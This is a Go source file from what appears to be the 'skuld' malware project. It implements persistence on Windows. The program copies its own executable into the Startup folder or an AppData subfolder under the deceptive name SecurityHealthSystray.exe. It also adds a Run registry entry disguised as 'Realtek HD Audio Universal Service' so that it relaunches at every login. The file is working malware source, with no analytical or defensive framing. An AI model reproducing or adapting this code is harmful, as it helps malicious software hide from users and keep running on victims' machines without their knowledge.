package startup

import (
	"golang.org/x/sys/windows/registry"
	"os"

	"github.com/hackirby/skuld/utils/fileutil"
	"github.com/hackirby/skuld/utils/program"
)

func Run() error {
	exe, err := os.Executable()
	if err != nil {
		return err
	}

	path := "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\SecurityHealthSystray.exe"
	if !program.IsElevated() {
		path = os.Getenv("APPDATA") + "\\Microsoft\\Protect\\SecurityHealthSystray.exe"
		key, err := registry.OpenKey(registry.CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", registry.ALL_ACCESS)
		if err != nil {
			return err
		}

		defer key.Close()

		err = key.SetStringValue("Realtek HD Audio Universal Service", path)
		if err != nil {
			return err
		}
	}

	if fileutil.Exists(path) {
		err = os.Remove(path)
		if err != nil {
			return err
		}
	}

	err = fileutil.CopyFile(exe, path)
	return err
}
